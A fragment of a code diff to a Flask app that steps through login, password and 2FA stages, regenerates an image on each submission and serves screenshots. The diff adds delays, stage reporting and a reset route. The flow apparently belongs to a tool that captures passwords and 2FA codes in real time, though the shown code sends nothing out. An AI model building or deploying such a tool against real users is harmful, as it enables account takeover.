@@ -161,15 +161,28 @@ def submit():
         state['stage'] = 'password'
         print("[SUBMIT] Password submitted -> showing PASSWORD ENTERED banner")
         generate_image()
-        return jsonify({'ok': True})
+        time.sleep(0.1)
+        generate_image()
+        return jsonify({'ok': True, 'stage': state['stage']})
     
     if cd and len(cd) >= 4:
         state['stage'] = '2fa'
         print("[SUBMIT] 2FA submitted")
         generate_image()
-        return jsonify({'ok': True})
+        time.sleep(0.1)
+        generate_image()
+        return jsonify({'ok': True, 'stage': state['stage']})
     
-    return jsonify({'ok': True})
+    return jsonify({'ok': True, 'stage': state['stage']})
+
+@app.route('/reset')
+def reset():
+    global state
+    state['stage'] = 'login'
+    state['update_count'] = 0
+    generate_image()
+    print("[RESET] Forced clean login state")
+    return jsonify({'ok': True, 'stage': 'login', 'msg': 'Clean login page'})
 
 @app.route('/screenshot')
 def shot():
